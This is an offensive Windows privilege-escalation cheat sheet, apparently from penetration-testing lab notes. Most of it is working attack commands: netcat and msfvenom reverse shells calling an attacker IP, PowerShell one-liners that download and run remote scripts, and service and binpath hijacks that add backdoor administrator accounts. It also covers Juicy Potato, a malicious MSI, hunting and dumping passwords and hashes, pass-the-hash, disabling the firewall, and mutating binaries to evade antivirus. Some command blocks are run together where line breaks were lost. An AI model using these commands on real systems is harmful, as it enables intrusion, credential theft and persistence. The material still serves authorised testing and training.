# Windows

## MindMap <a id="mindmap"></a>

![](https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LSy0aAo8OKT4I-Ahftv%2F-LT25kX_SagPT4HjllIA%2F-LT25mDxIziEWXPNSLhw%2Fimage.png?alt=media&token=bc7a6a34-a1ec-48f6-ad58-cf5c481cd342)

MindMap for PE

```text
https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md
```

* * * * * * * * * * * * * 
## Videos <a id="videos"></a>

​[https://www.youtube.com/playlist?list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP](https://www.youtube.com/playlist?list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP)

us rlwrap to improve windows shell

rlwrap nc -lnvp 443

## Useful commands <a id="useful-commands"></a>

```text
http://www.handgrep.se/repository/cheatsheets/postexploitation/WindowsPost-Exploitation.pdf
```

```text
https://github.com/emilyanncr/Windows-Post-Exploitation
```

## Credential reuse <a id="credential-reuse"></a>

```text
https://recipeforroot.com/windows-password-scouting/
```

Sometimes a user that you have the credentials for is also the administrator on the system, but uses the same password for both accounts. So never forget to try passwords when you have the chance. Just don't overdo it so you trigger some lockout mechanism and get detected.

Try the obvious - Maybe the user is SYSTEM or is already part of the Administrator group. As you can see from the output of the three commands below the username is _hacker_, he is part of the group _administrators._ In this case, a privilege escalation is not necessary because we are already in the administrators group!

* `whoami`
* `net localgroup administrator`
* `net user "%username%"`

![](https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LSy0aAo8OKT4I-Ahftv%2F-LT8Si-Wr1MNWtkSNhVg%2F-LT8VHbbnRgfgGudOmqd%2Fimage%20%2832%29.png?alt=media&token=943a59bf-ea1c-4c5b-8149-9b2157e43ae3)

https://github.com/chryzsh/practical-hacking/blob/master/part-4-privilege-escalation.md

Getting a shell in limited interpreters:

```text
system("start cmd.exe /k $cmd")
```

Bind cmd to a port:

```text
nc.exe -Lp 31337 -vv -e cmd.exe
```

Reverse shell:

```text
nc.exe attacker_ip attacker_port -e cmd.exe
```

## To capture NTLM hash  <a id="to-capture-ntlm-hash"></a>

```text
https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/
```

Spin up smbserver.py and connect via smb to your server on kali. ie smbclient -L //$kali$ip

```text
/usr/share/doc/python-impacket/examples/smbserver.py -smb2support test . Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation​[*] Config file parsed[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0[*] Config file parsed[*] Config file parsed[*] Config file parsed[*] Incoming connection (victimip:port)[*] AUTHENTICATE_MESSAGE (MicrosoftAccount\emailhere@gmail.com,DESKTOP-12345A)[*] User emailhere@gmail.com\DESKTOP-123456A authenticated successfully[*]emailhere@gmail.com::MicrosoftAccount:aad3c435b514a4eeaad3b935b51304fec46b9e58:aad3c435b514a4eeaad3b935b51304fec46b9e58:aad3c435b514a4eeaad3b935b51304fec46b9e58​
```

## System info <a id="system-info"></a>

Finding installed software, running processes, bind ports, and OS version might be critical to identify the right EoP vector.

Find installed patches, architecture, OS version

```text
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

Get exact OS version

```text
type C:/Windows/system32/eula.txt
```

Hotfix\(s\): N/A If there are no Hot fixes then its likely the system is vulnerable to kernel exploit

### Hostname <a id="hostname"></a>

Environment

List open connections

Network information

```text
ipconfig /all & route print & arp -a
```

### Information about a Users & Administrator <a id="information-about-a-users-and-administrator"></a>

Find current user.

### List all users <a id="list-all-users"></a>

#### Firewall information <a id="firewall-information"></a>

```text
netsh firewall show statenetsh firewall show config
```

#### List scheduled tasks <a id="list-scheduled-tasks"></a>

```text
schtasks /query /fo LIST /v
```

#### List windows services <a id="list-windows-services"></a>

Links running processes to started services

## Incorrect permissions in services <a id="incorrect-permissions-in-services"></a>

A service running as Administrator/SYSTEM with incorrect file permissions might allow PE. You can replace the binary, restart the service and get system.

We are interested in services where permissions are: **BUILTIN\Users** with **\(F\)** or **\(C\)** or **\(M\)** for our group. More info about permissions:

```text
https://msdn.microsoft.com/en-us/library/bb727008.aspx
```

Common exploitation payloads involve: Replacing the affecting binary with a reverse shell or a command that creates a new user and adds it to the Administrator group. Replace the affected service with your payload and and restart the service running:

```text
wmic service NAMEOFSERVICE call startservicenet stop [service name] && net start [service name]
```

```text
sc start/stop serviceName
```

#### Obtain the permission string of all services <a id="obtain-the-permission-string-of-all-services"></a>

```text
sc query state= all | findstr "SERVICE_NAME:" >> a & FOR /F "tokens=2 delims= " %i in (a) DO @echo %i >> b & FOR /F %i in (b) DO @(@echo %i & @sc sdshow %i & @echo ---------) & del a 2>nul & del b 2>nul
```

The following commands will print the affected services:

```text
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txtfor /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
```

If wmic is not available we can use sc.exe:

```text
sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txtFOR /F %i in (Servicenames.txt) DO echo %itype Servicenames.txtFOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txtFOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
```

You can also manually check each service using cacls:

```text
cacls "C:\path\to\file.exe"
```

If you don't have access to wmic, you can do:

Windows XP SP1 is known to be vulnerable to PE in **upnphost**. You get Administrator with:

```text
sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe YOUR_IP 1234 -e C:\WINDOWS\System32\cmd.exe"sc config upnphost obj= ".\LocalSystem" password= ""sc qc upnphost
```

If it fails because of a missing dependency, run the following:

```text
sc config SSDPSRV start= autonet start SSDPSRVnet start upnphost
```

Or remove the dependency:

```text
sc config upnphost depend= ""
```

Using meterpreter:

```text
exploit/windows/local/service_permissions
```

## acesschk.exe <a id="acesschk-exe"></a>

If wmic and sc is not available, you can use accesschk. For Windows XP, version 5.2 of accesschk is needed:

```text
https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe
```

```text
accesschk.exe -uwcqv "Authenticated Users" * /accepteulaaccesschk.exe -qdws "Authenticated Users" C:\Windows\ /accepteulaaccesschk.exe -qdws Users C:\Windows\
```

Then query the service using Windows sc:

```text
sc qc <vulnerable service name>
```

Then change the binpath to execute your own commands \(restart of the service will most likely be needed\):

```text
sc config <vuln-service> binpath= "net user backdoor backdoor123 /add"sc stop <vuln-service>sc start <vuln$ -service>sc config <vuln-service> binpath= "net localgroup Administrators backdoor /add"sc stop <vuln-service>sc start <vuln-service>
```

Note - Might need to use the depend attribute explicitly:sc stop &lt;vuln-service&gt;

```text
sc config <vuln-service> binPath= "c:\inetpub\wwwroot\runmsf.exe" depend= "" start= demand obj= ".\LocalSystem" password= ""sc start <vuln-service>
```

## Juicy Potato \(abusing the golden privileges\) <a id="juicy-potato-abusing-the-golden-privileges"></a>

If you have _SeAssingPrimaryToken_ or _SeImpersonate_ privileges, you can get SYSTEM.

![](https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LSy0aAo8OKT4I-Ahftv%2F-LrSq2cmgGPBos7pLdE-%2F-LrSqgBwM9JMiL0BcdS8%2Fimage.png?alt=media&token=1a30fb99-baf9-4ed3-b5b8-02c19d8e6db0)

### Vulnerable Win versions <a id="vulnerable-win-versions"></a>

```text
Windows 7 EnterpriseWindows 8.1 EnterpriseWindows 10 EnterpriseWindows 10 ProfessionalWindows Server 2008 R2 EnterpriseWindows Server 2012 DatacenterWindows Server 2016 Standard
```

create payload

```text
msfvenom -p windows/shell_reverse_tcp LHOST=$kaliip LPORT=444 -e x86/shikata_ga_nai -f exe -o rev.exe
```

run juicy potato

```text
JuicyPotato.exe -l 1340 -p C:\users\User\rev.exe -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
```

capture connection

```text
rlwrap nc -lnvp 444Ncat: Version 7.80 ( https://nmap.org/ncat )Ncat: Listening on :::444Ncat: Listening on 0.0.0.0:444Ncat: Connection from $ip.Ncat: Connection from $ip:54805.Microsoft Windows [Version 10.0.17134.590](c) 2018 Microsoft Corporation. All rights reserved.​C:\Windows\system32>
```

## Find unquoted paths <a id="find-unquoted-paths"></a>

If we find a service running as SYSTEM/Administrator with an unquoted path and spaces in the path we can hijack the path and use it to elevate privileges. This occurs because windows will try, for every white space, to find the binary in every intermediate folder.

For example, the following path would be vulnerable:

```text
C:\Program Files\something\winamp.exe
```

Not vulnerable

```text
"C:\Program Files\something\winamp.exe"
```

 **Obtain the path of the executable called by a Windows service \(good for checking Unquoted Paths\):**

```text
sc query state= all | findstr "SERVICE_NAME:" >> a & FOR /F "tokens=2 delims= " %i in (a) DO @echo %i >> b & FOR /F %i in (b) DO @(@echo %i & @echo --------- & @sc qc %i | findstr "BINARY_PATH_NAME" & @echo.) & del a 2>nul & del b 2>nul
```

We could place our payload with any of the following paths:

```text
C:\winamp.exe (this is a reverse shell with the same names as legal program)
```

#### The following command will display affected services: <a id="the-following-command-will-display-affected-services"></a>

```text
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
```

### Check Permissions <a id="check-permissions"></a>

We might even be able to override the service executable, always check out the permissions of the service binary:

```text
icacls "C:\Program Files (x86)\Program Folder"
```

You can automate with meterpreter:

```text
exploit/windows/local/trusted_service_path
```

## PowerUp <a id="powerup"></a>

PowerUp is an extremely useful script for quickly checking for obvious paths to privilege escalation on Windows. It is not an exploit itself, but it can reveal vulnerabilities such as administrator password stored in registry and similar. We shamelessly use [harmj0y's guide](https://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/) as reference point for the following guide. Some basic knowledge about how to import Powershell modules and used them is required.

PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations

Import the PowerUp module with the following:

`PS C:\>` `Import-Module PowerUp.ps1`

### **CanRestart**  <a id="canrestart"></a>

If you want to invoke everything without touching disk, use something like this:

`C:\> powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/1mK64oH’); Invoke-AllChecks”`

## Finding stuff fast <a id="finding-stuff-fast"></a>

#### ClearText passwords \(quick hits\) <a id="cleartext-passwords-quick-hits"></a>

`findstr /s /C:"stringtosearchfor.txt" "C:*"`

We might sometimes find passwords in arbitrary files, you can find them running:

```text
findstr /si password *.txtfindstr /si password *.xmlfindstr /si password *.ini
```

#### Find all those strings in config files. <a id="find-all-those-strings-in-config-files"></a>

```text
dir /s *pass* == *cred* == *vnc* == *.config*
```

#### Find all passwords in all files. <a id="find-all-passwords-in-all-files"></a>

```text
findstr /spin "password" *.*
```

```text
findstr /spin "password" *.*
```

These are common files to find them in. They might be base64-encoded. So look out for that.

```text
type c:\sysprep.inftype c:\sysprep\sysprep.xmltype c:\unattend.xmltype %WINDIR%\Panther\Unattend\Unattended.xmltype %WINDIR%\Panther\Unattended.xml
```

```text
dir c:*vnc.ini /s /bdir c:*ultravnc.ini /s /bdir c:\ /s /b | findstr /si *vnc.ini
```

#### Stuff in the registry: <a id="stuff-in-the-registry"></a>

```text
reg query HKLM /f password /t REG_SZ /sreg query HKCU /f password /t REG_SZ /sreg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
```

#### Using meterpreter: <a id="using-meterpreter"></a>

```text
post/windows/gather/credentials/gpppost/windows/gather/enum_unattend
```

## Pass the hash <a id="pass-the-hash"></a>

Pass The Hash allows an attacker to authenticate to a remote target by using a valid combination of username and NTLM/LM hash rather than a cleartext password.

Windows hash format:

```text
user:group:id:ntlmpassword::
```

You can do a hash dump in the affected system running:

```text
wce32.exe -wwce64.exe -wfgdump.exe
```

Download and run fgdump.exe on the target machine.

```text
 cd /usr/share/windows-binaries/fgdump; python -m SimpleHTTPServer 80
```

```text
pth-winexe -U DOMAIN/user%hash //$ip cmd
```

or:

```text
export SMBHASH=xxxpth-winexe -U user%  //$ip cmd
```

You can also do run as, with the hash:

### Technique 1: <a id="technique-1"></a>

```text
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

### Technique 2: <a id="technique-2"></a>

```text
secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Forcemycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)computer = "<hostname>"[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
```

```text
powershell -ExecutionPolicy Bypass -File c:\users\public\r.ps1
```

### Technique 3: <a id="technique-3"></a>

```text
psexec64 \\COMPUTERNAME -u Test -p test -h "c:\users\public\nc.exe -nc <attacker_ip> 4444 -e cmd.exe"
```

## Services only available from loopback <a id="services-only-available-from-loopback"></a>

You can find services bind to the loopback interface that are not reachable through the network running. Look for **LISTENING/LISTEN**:

Port forward using plinplink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080

Port forward using meterpreter

```text
portfwd add -l <attacker port> -p <victim port> -r <victim ip>portfwd add -l 3306 -p 3306 -r 192.168.1.101
```

#### If powershell is blocked, you can download: <a id="if-powershell-is-blocked-you-can-download"></a>

```text
https://github.com/Ben0xA/nps
```

Once you know the updates installed, you can find known exploits using windows-exploit-suggester.

```text
./windows-exploit-suggester.py -d 2017-02-09-mssb.xls -p ms16-075[*] initiating winsploit version 3.2…[*] database file detected as xls or xlsx based on extension[*] searching all kb’s for bulletin id MS16-075[+] relevant kbs [‘3164038’, ‘3163018’, ‘3163017’, ‘3161561’][*] done
```

In March 2017 Microsoft stopped maintaining the security bulletin search. This means the Windows Exploit Suggester database will not include any vulnerabilities or exploits found after that date. Still, this tool can still be very useful on older systems.

#### Compile windows exploit in linux: <a id="compile-windows-exploit-in-linux"></a>

```text
i686-w64-mingw32-gcc 18176.c -lws2_32 -o 18176.exe
```

#### Compiling python scripts to executables: <a id="compiling-python-scripts-to-executables"></a>

```text
wine ~/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile 18176.py
```

## AlwaysInstallElevated <a id="alwaysinstallelevated"></a>

**AlwaysInstallElevated** is a setting that allows non-privileged users the ability to run Microsoft Windows Installer Package Files \(MSI\) with elevated \(SYSTEM\) permissions.

Check if these 2 registry values are set to "1"reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

```text
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

If they are, create your own malicious msi:

```text
msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
```

Then use msiexec on victim to execute your msi:

```text
msiexec /quiet /qn /i C:\evil.msi
```

Metasploit module:

```text
use exploit/windows/local/always_install_elevated
```

### Windows-privesc-checker2 <a id="windows-privesc-checker2"></a>

```text
https://github.com/pentestmonkey/windows-privesc-check/archive/master.zip
```

## Vulnerable drivers <a id="vulnerable-drivers"></a>

Third party drivers might contain vulnerabilities, find them running:

## Kernel vulnerabilities <a id="kernel-vulnerabilities"></a>

#### Run exploit suggester against systeminfo: <a id="run-exploit-suggester-against-systeminfo"></a>

Don't rely on this - there are a lot of false positive! This is generally a last resort.

```text
https://github.com/GDSSecurity/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py
```

```text
python windows-exploit-suggester.py -d 2017-05-27-mssb.xls -i systeminfo.txt
```

#### Find installed paths: <a id="find-installed-paths"></a>

```text
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Comprehensive tables of vulnerabilities below: <a id="comprehensive-tables-of-vulnerabilities-below"></a>

```text
[+] Windows vulnerabilities:​Windows XP:CVE-2012-4349        Unquoted windows search path - Windows provides the capability of including spaces in path names - can be rootCVE-2011-1345        Internet Explorer does not properly handle objects in memory - allows remote execution of code via objectCVE-2010-3138        EXPLOIT-DB 14765 - Untrusted search path vulnerability - allows local users to gain privileges via a Trojan horseCVE-2011-5046        EXPLOIT-DB 18275 - GDI in windows does not properly validate user-mode input - allows remote code executionCVE-2002-1214        ms02_063_pptp_dos - exploits a kernel based overflow when sending abnormal PPTP Control Data packets - code execution, DoSCVE-2003-0352        ms03_026_dcom - exploits a stack buffer overflow in the RPCSS serviceCVE-2003-0533        MS04-011 - ms04_011_lsass - exploits a stack buffer overflow in the LSASS serviceCVE-2003-0719        ms04_011_pct - exploits a buffer overflow in the Microsoft Windows SSL PCT protocol stack - Private communication target overflowCVE-2010-3970        ms11_006_createsizeddibsection - exploits a stack-based buffer overflow in thumbnails within .MIC files - code executionCVE-2010-3147        EXPLOIT-DB 14745 - Untrusted search path vulnerability in wab.exe - allows local users to gain privileges via a Trojan horse CVE-2003-0812        ms03_049_netapi - exploits a stack buffer overflow in the NetApi32 CVE-2003-0818        ms04_007_killbill -  vulnerability in the bit string decoding code in the Microsoft ASN.1 libraryCVE-2003-0822        ms03_051_fp30reg_chunked - exploit for the chunked encoding buffer overflow described in MS03-051 CVE-2004-0206        ms04_031_netdde - exploits a stack buffer overflow in the NetDDE service​Windows 7:CVE-2014-4114        ms14_060_sandworm - exploits a vulnerability found in Windows Object Linking and Embedding - arbitrary code executionCVE-2015-0016        ms15_004_tswbproxy -  abuses a process creation policy in Internet Explorer's sandbox - code executionCVE-2014-4113        ms14_058_track_popup_menu - exploits a NULL Pointer Dereference in win32k.sys - arbitrary code executionCVE-2010-3227        EXPLOIT-DB - Stack-based buffer overflow in the UpdateFrameTitleForDocument method - arbitrary code executionCVE-2018-8494        remote code execution vulnerability exists when the Microsoft XML Core Services MSXML parser processes user inputCVE-2010-2744        EXPLOIT-DB 15894 - kernel-mode drivers in windows do not properly manage a window class - allows privileges escalationCVE-2010-0017        ms10_006_negotiate_response_loop - exploits a denial of service flaw in the Microsoft Windows SMB client - DoSCVE-2010-0232        ms10_015_kitrap0d - create a new session with SYSTEM privileges via the KiTrap0D exploitCVE-2010-2550        ms10_054_queryfs_pool_overflow - exploits a denial of service flaw in the Microsoft Windows SMB service - DoSCVE-2010-2568        ms10_046_shortcut_icon_dllloader - exploits a vulnerability in the handling of Windows Shortcut files (.LNK) - run a payload​Windows 8:CVE-2013-0008        ms13_005_hwnd_broadcast - attacker can broadcast commands from lower Integrity Level process to a higher one - privilege escalationCVE-2013-1300        ms13_053_schlamperei - kernel pool overflow in Win32k - local privilege escalationCVE-2013-3660        ppr_flatten_rec - exploits EPATHOBJ::pprFlattenRec due to the usage of uninitialized data - allows memory corruptionCVE-2013-3918        ms13_090_cardspacesigninhelper - exploits CardSpaceClaimCollection class from the icardie.dll ActiveX control - code executionCVE-2013-7331        ms14_052_xmldom - uses Microsoft XMLDOM object to enumerate a remote machine's filenamesCVE-2014-6324        ms14_068_kerberos_checksum - exploits the Microsoft Kerberos implementation - privilege escalationCVE-2014-6332        ms14_064_ole_code_execution -  exploits the Windows OLE Automation array vulnerability CVE-2014-6352        ms14_064_packager_python - exploits Windows Object Linking and Embedding (OLE) - arbitrary code executionCVE-2015-0002        ntapphelpcachecontrol - NtApphelpCacheControl Improper Authorization Check - privilege escalationWindows 10:  CVE-2015-1769        MS15-085 - Vulnerability in Mount Manager - Could Allow Elevation of PrivilegeCVE-2015-2426        ms15_078_atmfd_bof MS15-078 - exploits a pool based buffer overflow in the atmfd.dll driver CVE-2015-2479        MS15-092 - Vulnerabilities in .NET Framework - Allows Elevation of PrivilegeCVE-2015-2513        MS15-098 - Vulnerabilities in Windows Journal - Could Allow Remote Code ExecutionCVE-2015-2423        MS15-088 - Unsafe Command Line Parameter Passing - Could Allow Information DisclosureCVE-2015-2431        MS15-080 - Vulnerabilities in Microsoft Graphics Component - Could Allow Remote Code ExecutionCVE-2015-2441        MS15-091 - Vulnerabilities exist when Microsoft Edge improperly accesses objects in memory - allows remote code executionCVE-2015-0057        exploits GUI component of Windows namely the scrollbar element - allows complete control of a Windows machine​Windows Server 2003:CVE-2008-4114        ms09_001_write - exploits a denial of service vulnerability in the SRV.SYS driver - DoSCVE-2008-4250        ms08_067_netapi  - exploits a parsing flaw in the path canonicalization code of NetAPI32.dll - bypassing NX CVE-2017-8487        allows an attacker to execute code when a victim opens a specially crafted file - remote code execution
```

```text
https://github.com/SecWiki/windows-kernel-exploits
```

### Windows version map <a id="windows-version-map"></a>

```text
Operating System     Version Number​Windows 1.0                    1.04Windows 2.0                    2.11Windows 3.0                    3Windows NT 3.1                 3.10.528Windows for Workgroups 3.11    3.11Windows NT Workstation 3.5     3.5.807Windows NT Workstation 3.51    3.51.1057Windows 95                     4.0.950Windows NT Workstation 4.0     4.0.1381Windows 98                     4.1.1998Windows 98 Second Edition      4.1.2222Windows Me                     4.90.3000Windows 2000 Professional      5.0.2195Windows XP                     5.1.2600Windows Vista                  6.0.6000Windows 7                      6.1.7600Windows 8.1                    6.3.9600Windows 10                     10.0.10240
```

### Powersploit <a id="powersploit"></a>

PowerSploit is a collection of Microsoft PowerShell modules that can be used to aid penetration testers during all phases of an assessment

```text
https://github.com/PowerShellMafia/PowerSploitGet-GPPPasswordGet-UnattendedInstallFileGet-WebconfigGet-ApplicationHostGet-SiteListPasswordGet-CachedGPPPasswordGet-RegistryAutoLogon
```

### **Reverse Shell from Windows** <a id="reverse-shell-from-windows"></a>

If there’s a way, we can execute code from windows, we may try

* Uploading ncat and executing it
* Powershell Empire/ Metasploit Web-Delivery Method
* Invoke-Shellcode \(from powersploit\) see below

```text
Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('http://YourIPAddress:8000/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost YourIPAddress -Lport 4444 -Force"
```

```text
post/windows/gather/credentials/gpppost/windows/gather/enum_unattend
```

```text
getsystemgetprivsuse privhashdump
```

​[https://www.offensive-security.com/metasploit-unleashed/fun-incognito/](https://www.offensive-security.com/metasploit-unleashed/fun-incognito/)​

```text
use incognitolist_tokens -ulist_tokens -gimpersonate_token DOMAIN_NAME\\USERNAMEsteal_token PIDdrop_tokenrev2self
```

### Useful commands <a id="useful-commands-1"></a>

#### Add a new user <a id="add-a-new-user"></a>

```text
net user test 1234 /addnet localgroup administrators test /add
```

#### Print files contents: <a id="print-files-contents"></a>

#### Remove file <a id="remove-file"></a>

#### Change password for user: <a id="change-password-for-user"></a>

```text
net user <user> <password>
```

#### List users: <a id="list-users"></a>

#### Info about a user: <a id="info-about-a-user"></a>

#### Permissions on a folder recursively: <a id="permissions-on-a-folder-recursively"></a>

```text
cacls *.* /t /e /g domainname\administrator:f
```

## Enable RDP access <a id="enable-rdp-access"></a>

This is useful to do because generally it is easier to manipulate windows using the GUI. The downside is that you're most definitely will have an impact on the machine, as you may have to create a user or change a user's password to get in.

```text
reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0netsh firewall set service remoteadmin enablenetsh firewall set service remotedesktop enable
```

#### Disable firewall <a id="disable-firewall"></a>

```text
netsh firewall set opmode disable
```

#### Run exploit <a id="run-exploit"></a>

```text
C:\tmp>powershell -ExecutionPolicy ByPass -command "& { . C:\tmp\Invoke-MS16-032.ps1; Invoke-MS16-032 }"
```

### JAWS <a id="jaws"></a>

```text
https://411hall.github.io/JAWS-Enumeration/
```

Module to elevate privileges to SYSTEM by creating a service or hijacking existing ones with incorrect permissions

```text
exploit/windows/local/service_permissions
```

## Other scripts <a id="other-scripts"></a>

```text
https://github.com/GDSSecurity/Windows-Exploit-Suggesterhttps://github.com/Jean13/Penetration_Testing/blob/master/Privilege_Escalation/windows-privesc-check2.exe
```

### Generate php reverse shell: <a id="generate-php-reverse-shell"></a>

```text
msfvenom -p php/reverse_php LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.phpmsfvenom -p php/meterpreter/reverse_tcp LHOST=<attacker_ip> -o meterpreter.phpmsfvenom -p generic/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f php -o shell.php
```

### Others <a id="others"></a>

```text
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
```

### Generate shellcode to use within a perl exploit: <a id="generate-shellcode-to-use-within-a-perl-exploit"></a>

```text
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f perl -b \x00\x0A\x0D\xFF
```

### Raw paylaod: <a id="raw-paylaod"></a>

```text
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f raw -o test.bin
```

### Js payload: <a id="js-payload"></a>

```text
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f js_le
```

### Handling reverse shell using meterpreter: <a id="handling-reverse-shell-using-meterpreter"></a>

```text
use exploit/multi/handlerset lport 1234set lhost <attacker_ip>set payload windows/shell/reverse_tcprun
```

### Other payloads: <a id="other-payloads"></a>

```text
set PAYLOAD windows/meterpreter/reverse_tcpset PAYLOAD generic/shell_reverse_tcpset PAYLOAD linux/x86/meterpreter/reverse_tcp
```

### Privilege escalation <a id="privilege-escalation"></a>

## Useful exploits <a id="useful-exploits"></a>

### Automatically downloads and compiles exploit <a id="automatically-downloads-and-compiles-exploit"></a>

```text
wget https://raw.githubusercontent.com/wwong99/pentest-notes/master/scripts/xploit_installer.py
```

```text
USAGE: xploit_installer.py <exploit id>
```

### Windows Remote Exploits: <a id="windows-remote-exploits"></a>

```text
0: windows_exploit_suggester1: ms03-0262: ms03-039 (1)3: ms03-039 (2)4: *ms03-0495: ms04-0076: ms04-011 - ssl bof7: ms04-011 - lsasarv.dll8: ms04-0319: ms05-01710: ms05-03911: *ms06-040 (1)12: ms06-040 (2)13: ms06-07014: *ms08-067 (1)15: ms08-067 (2)16: ms08-067 (3)17: *ms09-050
```

### Windows Local Exploits: <a id="windows-local-exploits"></a>

```text
18: windows-privesc-check19: ms04-01120: ms04-019 (1)21: ms04-019 (2)22: ms04-019 (3)23: ms04-02024: *keybd_event25: *ms05-01826: *ms05-05527: ms06-03028: ms06-04929: print spool service30: *ms08-02531: netdde32: ms10-01533: ms10-05934: ms10-09235: ms11-08036: ms14-04037: *ms14-058 (1)38: ms14-058 (2)39: *ms14-070 (1)40: ms14-070 (2)41: *ms15-010 (1)42: *ms15-010 (2)43: ms15-05144: *ms16-01445: ms16-01646: ms16-032
```

Check out:

```text
http://www.bhafsec.com/wiki/index.php/Windows_Privilege_Escalation
```

#### Windows Server 2003 and IIS 6.0 privilege escalation using impersonation: <a id="windows-server-2003-and-iis-6-0-privilege-escalation-using-impersonation"></a>

```text
https://www.exploit-db.com/exploits/6705/
```

```text
https://github.com/Re4son/Churrasco
```

```text
c:\Inetpub>churrasco churrasco /churrasco/-->Usage: Churrasco.exe [-d] "command to run"​ c:\Inetpub>churrasco -d "net user /add <username> <password>" c:\Inetpub>churrasco -d "net localgroup administrators <username> /add"
```

### Windows MS11-080 <a id="windows-ms-11-080"></a>

http://www.exploit-db.com/exploits/18176/

```text
python pyinstaller.py --onefile ms11-080.py
```

From admin to system

```text
psexec.exe -i -s %SystemRoot%\system32\cmd.exe
```

```text
https://github.com/Cn33liz/EasySystem 
```

### AV bypass <a id="av-bypass"></a>

Generating a mutated binary to bypass antiviruses

```text
wine hyperion.exe ../backdoor.exe ../backdoor_mutation.exe
```

## Access Check <a id="access-check"></a>

You will probably need to accept the eula first:

```text
accesschk.exe /accepteula
```

## Windows hashes <a id="windows-hashes"></a>

if you capture a hash - put it into Google someone might have cracked it before

NTLM and LM passwords are located in the SAM file in **C:\\Windows\SYSTEM32\CONFIG**

LAN Manager \(LM\): Windows XP and prior use LAN manager protocol. Uses DES but the key space is small \(only uppercase, not salted, 14 chars or padded to 14\).

NTLM/NTLM2: It does not split the password, also stored in uppercase

Kerberos: Default protocol for active directory envs.PoCs

Add user to administrator group

```text
#include <stdlib.h>int main (){int i;    i = system("net localgroup administrators theusername /add");return 0;}
```

```text
i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe
```

#### Run an arbitrary command: <a id="run-an-arbitrary-command"></a>

```text
echo -e '#include <stdio.h>\n#include <smain () {\nsystem("C:\\Users\\Administrator\\Desktop\\nc -lvp 4313 -e cmd.exe");\nreturn(0);\n}'> poc.c
```

## Print proof <a id="print-proof"></a>

```text
echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & echo. & echo Hostname: & hostname & echo. & ipconfig /all & echo. & echo proof.txt: &  type "C:\Documents and Settings\Administrator\Desktop\proof.txt"
```

